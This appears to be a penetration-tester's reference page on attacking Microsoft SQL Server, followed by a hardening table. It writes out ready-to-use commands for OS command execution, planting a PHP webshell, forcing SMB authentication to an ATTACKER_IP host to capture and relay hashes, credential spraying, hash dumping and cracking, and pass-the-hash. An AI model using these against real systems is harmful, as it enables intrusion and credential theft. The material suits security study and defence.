+++
title = 'MSSQL'
date = 2026-10-30
type = 'notes'
weight = 500
toc = true
tags = ['protocols', 'services', 'mssql']
+++

Microsoft SQL Server (MSSQL) is Microsoft's SQL-based relational database management system. The default port is **TCP 1433**. In Active Directory environments, MSSQL is consistently one of the highest-value targets: it is **almost always over-privileged, frequently under-monitored**, and the service account running it is typically a domain account with broad rights.

> **2025–2026 context:** the attack surface has expanded in three directions. **SQL Server 2025's AI features** (`sp_invoke_external_rest_endpoint`, `CREATE EXTERNAL MODEL`) provide native HTTPS exfiltration and C2 channels that never touch `xp_cmdshell`. **Microsoft-signed stored procedures** contain SQL injection that re-enables a disabled `xp_cmdshell`. And **Machine Learning Services** (`sp_execute_external_script`) is now a documented `xp_cmdshell` alternative because EDR has become very good at catching the classic path.

---

## 1. Enumeration and Connection

### 1.1 Nmap NSE

```bash
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,\
ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,\
mssql.instance-name=MSSQLSERVER -sV -p 1433 <target>
```

### 1.2 Connection methods

| Client | Command |
|---|---|
| **Impacket (Windows auth)** | `mssqlclient.py <user>@<target> -windows-auth` |
| **Impacket (SQL auth)** | `mssqlclient.py <user>:<password>@<target>` |
| **Impacket (Kerberos)** | `mssqlclient.py -k -no-pass <user>@<target>` |
| **sqlcmd** | `sqlcmd -S <target> -U <user> -P <password> -y 30 -Y 30` |
| **sqsh** | `sqsh -S <target> -U <user> -P <password> -h` |
| **sqsh (local Windows account)** | `sqsh -S <target> -U .\\<user> -P <password> -h` |

### 1.3 Interacting with the server

| Command | Description |
|---|---|
| `SELECT name FROM master.dbo.sysdatabases;` | List databases |
| `USE users;` | Switch database |
| `SELECT table_name FROM users.INFORMATION_SCHEMA.TABLES;` | List tables in `users` |
| `SELECT * FROM users;` | Dump a table |
| `SELECT @@version;` | Version fingerprint |
| `SELECT SYSTEM_USER;` | Current login |
| `SELECT IS_SRVROLEMEMBER('sysadmin');` | Are you sysadmin? |

---

## 2. Command Execution

### 2.1 `xp_cmdshell` — the classic path

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

**Prerequisites:** `sysadmin` (or `ALTER SETTINGS` / `CONTROL SERVER`), plus `EXECUTE` on the procedure. `RECONFIGURE` is required after each `sp_configure`.

> **`xp_cmdshell` runs as the MSSQL service account.** If that account is a domain account — which it frequently is — you have code execution in the domain, not just on the host.

If you are **not** sysadmin, check `EXECUTE AS LOGIN` impersonation and linked servers before concluding command execution is unavailable.

### 2.2 Bypassing a **disabled** `xp_cmdshell` — `sys.sp_MSdeletefoldercontents`

**2026 discovery (Red Gate / Fabiano Amorim):** `sys.sp_MSdeletefoldercontents` is a **Microsoft-signed system stored procedure** used by replication. It accepts a folder path, **concatenates it into a dynamically generated T-SQL batch**, and executes it with `sp_executesql` — **without parameterisation**. A caller can terminate the intended string literal and append arbitrary T-SQL.

The security relevance is precise: a **direct** `xp_cmdshell` call fails with *“component is turned off”*, but the **same `xp_cmdshell` call injected into `sp_MSdeletefoldercontents` succeeds** — without an explicit `sp_configure`/`RECONFIGURE`.

> **This is not a privilege escalation from a normal user.** The procedure checks for `sysadmin` membership, so the prerequisite is already highly privileged. It is an **alternate execution path** — it defeats the assumption that *“xp_cmdshell is disabled, therefore OS command execution is blocked.”* Security baselines that only check the `xp_cmdshell` configuration value will miss it.

### 2.3 Machine Learning Services — the EDR-evading path

SQL Server **Machine Learning Services** executes R, Python, and Java inside the database engine through `sp_execute_external_script`. The feature is controlled by the **`external scripts enabled`** server configuration option, which is **off by default**.

```sql
EXEC sp_configure 'external scripts enabled', 1;
RECONFIGURE;

EXEC sp_execute_external_script
  @language = N'Python',
  @script = N'import os; os.system("whoami")';
```

**Why it matters in 2026:** Netragard documented this as a deliberate **`xp_cmdshell` alternative** because *“EDRs have become very good at catching the classic `xp_cmdshell` path.”* The technique abuses the **Launchpad service** to execute arbitrary code, and a **NetExec module** now automates command execution and reverse shells through R.

> **Prerequisite:** `Machine Learning Services` must be installed, and `external scripts enabled` must be set. Both are more common on analytics-enabled servers than on line-of-business databases — check before assuming it is available.

### 2.4 Other execution primitives

| Primitive | Enables | Notes |
|---|---|---|
| **CLR assemblies** | Load a .NET DLL, call managed code | `sp_configure 'clr enabled', 1`; requires `UNSAFE` or `EXTERNAL_ACCESS` |
| **OLE Automation** | `sp_OACreate` → `Scripting.FileSystemObject` | File write and command execution |
| **SQL Agent jobs** | Run a job step as the Agent service account | `msdb.dbo.sp_add_job` |
| **External scripts** | Python / R / Java via Launchpad | §2.3 |
| **`sp_invoke_external_rest_endpoint`** | Native HTTPS request | §3, SQL Server 2025 |

---

## 3. SQL Server 2025 AI Features — Exfiltration and C2

SpecterOps published *“Oops, I Weaponized the Database”* in **June 2026**, documenting how SQL Server 2025's AI features become **data-exfiltration and C2 channels inside the database engine** — no `xp_cmdshell`, no SQL Agent job, no PowerShell.

### 3.1 `sp_invoke_external_rest_endpoint` — native HTTPS exfil

SQL Server 2025 on-premises can **hit arbitrary REST endpoints** through this stored procedure.

```sql
DECLARE @response NVARCHAR(MAX);
EXEC sp_invoke_external_rest_endpoint
  @url = N'https://api.example.com/data',
  @method = 'POST',
  @headers = N'{"Content-Type":"application/json"}',
  @payload = N'{"query":"example"}',
  @response = @response OUTPUT;
SELECT @response;
```

**Requirements — and they are minimal:**

1. The stored procedure is enabled for the instance.
2. Requests must use **HTTPS**.
3. The remote server must have a **verifiable certificate chain**.

**The payload limit is 100 MB** in both directions — this is not a constrained channel.

> **Why this is a step change:** the traffic is an ordinary HTTPS `POST` to a legitimate certificate. It does not touch `xp_cmdshell`, does not spawn `powershell.exe`, and does not require a SQL Agent job. Network detection that keys on those artifacts sees nothing.

### 3.2 `CREATE EXTERNAL MODEL` — ONNX model with a UNC path

`CREATE EXTERNAL MODEL` defines an external AI embedding model inside the engine and supports **locally hosted ONNX models via UNC paths**.

> **The UNC path is the coercion primitive.** Pointing `CREATE EXTERNAL MODEL` at a **malicious UNC path** forces SQL Server to **authenticate over SMB**, capturing the service account's **Net-NTLMv2 hash** for relay or offline cracking. Microsoft reviewed the report (submitted 20 April 2026) and, per the researcher, did not treat it as a security boundary crossing.

**Impact chain:** AI-feature coercion → Net-NTLMv2 capture → **relay to LDAP/S or ADCS** → domain escalation. The same primitive that `xp_dirtree` has always provided, now reachable through a feature that baselines rarely cover.

### 3.3 Persistent exfiltration

SpecterOps also documented **persistent exfiltration** — using the AI features to maintain a repeatable exfiltration path rather than a one-shot transfer. The PoCs are public at `github.com/gershsec/mssql2025-poc`.

---

## 4. File Read and Write

### 4.1 Read a file

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;
```

The account must have read access to the file. `OPENROWSET(BULK ...)` is the standard read primitive and does **not** require `xp_cmdshell`.

### 4.2 Write a file — OLE Automation

OLE Automation Procedures must be enabled (requires admin privileges).

```sql
-- Enable
sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- Write a file
DECLARE @OLE INT, @FileID INT;
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\path\to\webshell.php', 8, 1;
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>';
EXECUTE sp_OADestroy @FileID;
EXECUTE sp_OADestroy @OLE;
```

> **Writing into a webroot is the standard MSSQL-to-RCE path** when `xp_cmdshell` is unavailable but OLE Automation is enabled. Check whether the IIS/Apache webroot is writable by the MSSQL service account before writing a shell that will never execute.

---

## 5. Hash Capture — Forced Authentication

### 5.1 `xp_dirtree` / `xp_subdirs`

Both procedures accept a UNC path and cause the **MSSQL service account** to authenticate to it over SMB.

```sql
EXEC master..xp_dirtree '\\ATTACKER_IP\share\';
EXEC master..xp_subdirs  '\\ATTACKER_IP\share\';
```

**Start a listener first:**

```bash
sudo responder -I tun0
# or
sudo impacket-smbserver share ./ -smb2support
```

The captured **Net-NTLMv2** hash can be cracked offline or **relayed** to another service.

### 5.2 The 2026 coercion surface

| Vector | Primitive |
|---|---|
| **`xp_dirtree` / `xp_subdirs`** | Classic SMB coercion |
| **`xp_fileexist`** | Also triggers an outbound SMB connection |
| **`CREATE EXTERNAL MODEL` (UNC)** | SQL Server 2025 AI-feature coercion |
| **`sp_invoke_external_rest_endpoint`** | HTTPS — not SMB, but still attacker-controlled egress |

> **If the hash does not crack, relay it.** SMB signing is frequently disabled on member servers, and **CVE-2025-33073** (SMB client reflection, 2025) removed the admin prerequisite that previously limited relay. `impacket-ntlmrelayx.py` has a **SMB → MSSQL relay module** that validates SMB credentials and then relays the authentication against an MSSQL server.

---

## 6. Impersonation

SQL Server's **`IMPERSONATE`** permission allows a login to take on the permissions of another login until the context is reset or the session ends.

### 6.1 Check and enumerate

```sql
-- Are you sysadmin? (sysadmins can impersonate anyone)
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');

-- Who can you impersonate?
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```

### 6.2 Impersonate

```sql
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
```

### 6.3 Automated chaining

**MSSqlPwner** performs **recursive enumeration** — it analyses linked servers and **potential impersonation paths** to uncover command-execution chains, then executes them.

```bash
mssqlpwner corp.com/user:lab@192.168.1.65
```

It is built on Impacket and supports **cleartext passwords, NTLM hashes, and Kerberos tickets** — with command execution through **custom assembly, `xp_cmdshell`, and `sp_oacreate`**.

---

## 7. Linked Servers

A **linked server** lets one SQL instance query another, using the credentials configured for the link — **often a high-privilege account**.

### 7.1 Enumerate

```sql
SELECT srvname, isremote FROM sysservers;
EXEC sp_linkedservers;
```

### 7.2 Query the remote instance

```sql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')')
  AT [10.10.10.100\SQLSERVERNAME];
```

### 7.3 Chain across linked servers

If the link is configured with a privileged account, you can **traverse the chain** and execute commands on every instance it reaches — a **linked-server hop**.

**mssql-spider** automates this: it *“discovers and exploits as many Microsoft SQL Servers as it can reach by crawling linked instances and abusing user impersonation.”*

```bash
# Spray default credentials across a subnet, then crawl and execute
mapcidr -cidr 192.168.178.0/24 | mssql-ping | tee instances.json \
  | mssql-spray passwords -c ./assets/default-credentials.txt | tee logins.json \
  | mssql-spider -x 'whoami /all'

# Fetch MSSQL SPNs from BloodHound, then coerce NTLM from every reachable server
mssql-discover bloodhound | mssql-ping | mssql-spider -d corp.local -u jdoe -p 'passw0rd' \
  --sysinfo -c '\\192.168.178.128\harvest'
```

> **mssql-spider can solve the OSEP Lab Challenge 2 automatically** — it is the reference tool for linked-server and impersonation chaining at scale.

---

## 8. Hash Dumping and Cracking

### 8.1 Dump

```sql
-- Requires CONTROL SERVER or sysadmin
SELECT name, password_hash FROM sys.sql_logins;
```

### 8.2 Crack

MSSQL hashes are `0x0100` + 4-byte salt + 20-byte SHA-1 hash of the salted password (UTF-16LE).

```bash
hashcat -m 1731 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**mssql-spider automates the entire chain:**

```bash
mssql-spider -u sa -p 'passw0rd' -t db01.corp.local \
  --dump-hashes ./hashes.txt --dump-jobs --dump-autologon

hashcat -O -w 3 -a 0 -m 1731 --username ./hashes.txt ./rockyou.txt
```

> **`-m 1731` is the MSSQL 2012+ hash mode.** Older hashes (`0x0100` with a different format) use `-m 132`. `--dump-jobs` and `--dump-autologon` also recover **SQL Agent job credentials** and **autologon passwords** stored on the host.

---

## 9. Recent CVEs (2025–2026)

| CVE | Severity | Primitive | Affected |
|---|---|---|---|
| **CVE-2026-77485** | Critical | **Use-after-free** — authenticated user elevates privileges locally | SQL Server |
| **CVE-2026-77487** | **8.8** | **Improper access control** — authenticated user elevates over the network | SQL Server |
| **CVE-2026-68787** | High | **Heap-based buffer overflow** — authorized attacker executes code locally | SQL Server |
| **CVE-2026-67370** | High | **SQL injection** in SQL Server — network privilege escalation | SQL Server |
| **CVE-2026-20803** | **7.2** | **Missing authentication for a critical function** — network privilege escalation; debug privileges including memory dump capability | SQL Server 2025 < 17.0.1050.2 |
| **CVE-2026-26116 / 26115 / 21262** | High | Elevation of privilege (Microsoft advisories, March 2026) | SQL Server |
| **CVE-2025-51683** | High | **`xp_cmdshell` activation** in Mjobtime MSSQL — observed in **three separate customer environments** during 2025 | Mjobtime ≤ 15.7.2 |
| **CVE-2025-33073** | High | **SMB client reflection** — any domain user → SYSTEM on non-SMB-signing hosts; frequently reached through an MSSQL relay | Windows |

> **CVE-2026-20803 is the one to read carefully.** *“Missing authentication for critical function”* means a critical database function can be reached **without authentication** — and the successful exploit grants **debug privileges including the ability to dump memory**. On a SQL Server, a memory dump of the engine process can contain credentials, connection strings, and query text.

---

## 10. Tooling

| Tool | Language | What it does |
|---|---|---|
| **MSSqlPwner** | Python (Impacket) | Recursive linked-server and impersonation enumeration; command execution via **custom assembly, `xp_cmdshell`, `sp_oacreate`**; **Kerberos ticket auth**; NTLM relay support; configurable `--max-link-depth` and `--max-impersonation-depth` |
| **mssql-spider** | Python | **Automated exploitation at scale** — `mssql-ping`, `mssql-spray`, BloodHound SPN discovery, **linked-server crawling**, impersonation abuse, **CLR assembly execution**, hash dumping, hashcat mode 1731 |
| **SQLRecon** | C# | Offensive recon and post-exploitation; **enumeration modules** (Info, SqlSpns); auth providers include **WinToken, WinDomain, Local, EntraID, AzureLocal, and Pth** (pass-the-hash over raw TDS/NTLM — **no `SeImpersonate` required**) |
| **PowerUpSQL** | PowerShell | Discovery, weak-config auditing, **privilege escalation at scale**, post-exploitation; new **`QuickAudit`** switch on `Invoke-SQLAudit` for rapid environment assessment |
| **SqlmapXPlus** | Python | SQL injection automation — **OLE and `xp_cmdshell` file upload, in-memory webshell, CLR installation**, automated privilege escalation and backdoor accounts |
| **NetExec MSSQL module** | Python | Credential spraying, command execution, MSSQL-specific modules |

### 10.1 SQLRecon — the authentication breadth

SQLRecon's value is its **authentication provider coverage**, which maps directly to an AD engagement:

| Provider | Use case |
|---|---|
| **WinToken** | Use the current user's token — no credentials |
| **WinDomain** | AD credentials |
| **Local** | Local SQL login |
| **EntraID** | Azure Entra ID credentials against Azure SQL |
| **AzureLocal** | Local SQL credentials against Azure SQL |
| **Pth** | **NT hash over raw TDS/NTLM** — no elevated privileges or `SeImpersonate` required |

```text
SQLRecon.exe /a:WinDomain /h:SQL01 /d:CORP /u:jdoe /p:passw0rd /m:whoami
SQLRecon.exe /a:Pth /h:SQL01 /d:CORP /u:jdoe /hash:8846f7ea... /m:whoami
```

---

## 11. Testing Methodology

```text
1. Discover and connect
   - nmap ms-sql-* scripts
   - mssqlclient.py / sqlcmd / sqsh
   - SQLRecon enumeration modules

2. Privilege check
   - SELECT IS_SRVROLEMEMBER('sysadmin');
   - SHOW GRANTS / sys.server_permissions

3. Command execution — try in order
   - xp_cmdshell (if sysadmin)
   - sp_MSdeletefoldercontents bypass (if xp_cmdshell disabled but you are sysadmin)
   - Machine Learning Services (if external scripts enabled)
   - OLE Automation
   - CLR assembly
   - SQL Agent job

4. File read / write
   - OPENROWSET(BULK ...) for read
   - OLE Automation for write
   - Target a webroot for RCE

5. Coercion
   - xp_dirtree / xp_subdirs / xp_fileexist → Responder
   - CREATE EXTERNAL MODEL with a UNC path (SQL Server 2025)
   - Relay the captured hash (SMB → MSSQL, LDAP, ADCS)

6. Impersonation
   - Enumerate IMPERSONATE grants
   - EXECUTE AS LOGIN = 'sa'
   - MSSqlPwner for recursive chains

7. Linked servers
   - sysservers / sp_linkedservers
   - EXECUTE(...) AT [linked]
   - mssql-spider for automated crawling

8. Credentials
   - Dump sys.sql_logins
   - hashcat -m 1731
   - --dump-jobs / --dump-autologon

9. SQL Server 2025 AI features
   - sp_invoke_external_rest_endpoint → HTTPS exfil / C2
   - CREATE EXTERNAL MODEL → UNC coercion

10. Patch level
    - CVE-2026-20803 (missing auth, CVSS 7.2)
    - CVE-2026-77487 (improper access control, 8.8)
    - CVE-2025-51683 (xp_cmdshell activation)
```

---

## 12. Hardening

| Control | How |
|---|---|
| **Remove excessive privileges** | Application logins should not be `sysadmin`; audit `sys.server_permissions` |
| **Disable `xp_cmdshell`** | `sp_configure 'xp_cmdshell', 0` — but **do not rely on it alone** (§2.2 bypass) |
| **Monitor `sys.sp_MSdeletefoldercontents`** | Alert on execution — it is a replication procedure, not a normal application call |
| **Disable OLE Automation** | `sp_configure 'Ole Automation Procedures', 0` |
| **Disable external scripts** | `sp_configure 'external scripts enabled', 0` |
| **Restrict `sp_invoke_external_rest_endpoint`** | Disable on instances that do not need it; monitor for HTTPS egress from SQL Server |
| **Block outbound SMB from the SQL Server** | Prevents `xp_dirtree` / `CREATE EXTERNAL MODEL` coercion |
| **Set SMB signing** | Closes the relay path after coercion |
| **Run the service as a low-privilege account** | A gMSA or virtual account, not a domain admin |
| **Patch** | CVE-2026-20803, CVE-2026-77487, CVE-2026-77485, CVE-2026-68787 |
| **Audit `IMPERSONATE`** | `SELECT ... FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE'` |
| **Audit linked servers** | Remove unused links; do not configure them with `sysadmin` credentials |

---

## 13. Field Notes

- **`xp_cmdshell` being disabled is not proof that command execution is blocked.** `sys.sp_MSdeletefoldercontents` re-enables it through a Microsoft-signed procedure, without `sp_configure` — and baselines that only check the config value miss it.
- **Machine Learning Services is the EDR-evasion path in 2026.** `sp_execute_external_script` executes Python/R/Java through the Launchpad service, bypassing the heavily-monitored `xp_cmdshell` chain.
- **SQL Server 2025's `sp_invoke_external_rest_endpoint` is a native HTTPS exfil channel.** Up to **100 MB** per request, over a valid certificate chain, with **no `xp_cmdshell` and no PowerShell**.
- **`CREATE EXTERNAL MODEL` is a coercion primitive.** A UNC path forces SMB authentication and captures the service account's Net-NTLMv2 hash — the same outcome as `xp_dirtree`, through a feature most baselines do not cover.
- **If the hash does not crack, relay it.** `ntlmrelayx` has a **SMB → MSSQL relay module**, and **CVE-2025-33073** removed the admin prerequisite for reflection.
- **`IMPERSONATE` plus a linked server is a domain-wide chain.** MSSqlPwner and mssql-spider both automate the recursive enumeration — do not walk it by hand.
- **SQLRecon's `Pth` provider works over raw TDS/NTLM** — pass-the-hash against MSSQL **without** elevated privileges or `SeImpersonate`.
- **`mssql-spider` solves OSEP Lab Challenge 2 automatically.** It is the reference tool for linked-server and impersonation chaining.
- **`hashcat -m 1731` is the MSSQL 2012+ hash mode** — `0x0100` + salt + SHA-1. `-m 132` is the older format.
- **CVE-2026-20803 grants debug privileges including memory dump.** On a SQL Server, a memory dump can contain credentials, connection strings, and query text — patch it first.
- **Mjobtime's CVE-2025-51683 was exploited in three separate customer environments in 2025** — the pattern is always the same: `xp_cmdshell` activated, then OS commands as the service account.
